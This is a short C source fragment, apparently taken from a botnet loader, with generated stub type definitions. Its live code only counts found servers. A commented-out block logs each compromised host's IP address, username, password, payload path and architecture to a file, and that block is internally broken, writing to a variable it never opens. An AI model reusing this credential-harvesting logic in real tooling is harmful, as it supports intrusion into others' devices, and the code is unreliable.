#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */

/* Variables and functions */
 int /*<<< orphan*/  found_srvs ; 

void handle_found(int fd)
{
    /* 
    struct stateSlot_t *state = &stateTable[fd];
    
    struct sockaddr_in name;
    int namelen = (sizeof (struct sockaddr_in));

    getpeername(state->fd, &name, &namelen);
    
    FILE *fp = fopen("loaded.txt", "a");
    fprintf(outfd, "%d.%d.%d.%d:%s:%s:%s:%d:%d:%d\n",
        (name.sin_addr.s_addr & 0xff), 
        ((name.sin_addr.s_addr & (0xff << 8)) >> 8), 
        ((name.sin_addr.s_addr & (0xff << 16)) >> 16),
        ((name.sin_addr.s_addr & (0xff << 24)) >> 24), 
        
        state->username, 
        state->password, 
        state->path, 
        state->wget, 
        state->endianness, 
        state->arch
    );
    fclose(outfd);
    */
    
    found_srvs++;
}